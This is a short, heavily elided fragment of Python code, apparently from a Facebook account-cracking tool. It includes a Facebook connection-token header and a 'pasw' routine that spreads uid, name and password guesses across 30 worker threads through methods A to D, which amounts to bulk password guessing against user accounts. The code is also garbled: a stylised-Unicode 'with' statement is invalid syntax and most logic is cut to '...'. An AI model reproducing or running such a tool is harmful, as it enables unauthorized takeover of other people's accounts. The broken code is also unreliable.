...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            with sarfraz𝕯𝖆𝖗𝖐 (max_workers=30) as 𝕯𝖆𝖗𝖐 world:
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           ...
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                𝕯𝖆𝖗𝖐 world.submit(self.methodA, uid, name, pwx)

                            elif 'methodB' in methods:

                                𝕯𝖆𝖗𝖐 world.submit(self.methodB, uid, name, pwx)

                            elif 'methodC' in methods:

                                𝕯𝖆𝖗𝖐 world.submit(self.methodC, uid, name, pwx)

                            elif 'methodD' in methods:

                                𝕯𝖆𝖗𝖐 world.submit(self.methodD, uid, name, pwx)
